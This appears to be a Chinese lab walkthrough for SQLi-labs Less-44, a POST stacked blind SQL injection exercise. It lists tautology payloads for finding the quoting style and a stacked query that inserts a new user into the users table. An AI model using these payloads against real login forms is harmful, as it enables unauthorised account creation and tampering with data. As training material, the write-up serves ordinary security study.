# POST-Error based-string-Stacked Blind 
TAG：POST型注入、堆叠注入、盲注  
## 漏洞利用  
![less44_1](images\less44_1.png)  
此less是less42的变种，但是并么有password栏的报错提示  
![less44_2](images\less44_2.png)  
  
为获得参数包裹方式要构建多个永真条件语句，通过显示页面的不同来进行判断  
Payload1:```1 or 1=1--+```  
Payload2:```1' or 1=1--+```  
Payload3:```1" or 1=1--+```  
Payload4:```1') or 1=1--+```  
Payload5:```1") or 1=1--+```  
通过测试发现参数被单引号包裹  
![less44_3](images\less44_3.png)  
  
构造插入用户的语句  
Payload:```1';insert into users(id,username,password) values ('23','less44','hello')--+```  
![less44_4](images\less44_4.png)  
  
成功创建用户  
![less44_5](images\less44_5.png)  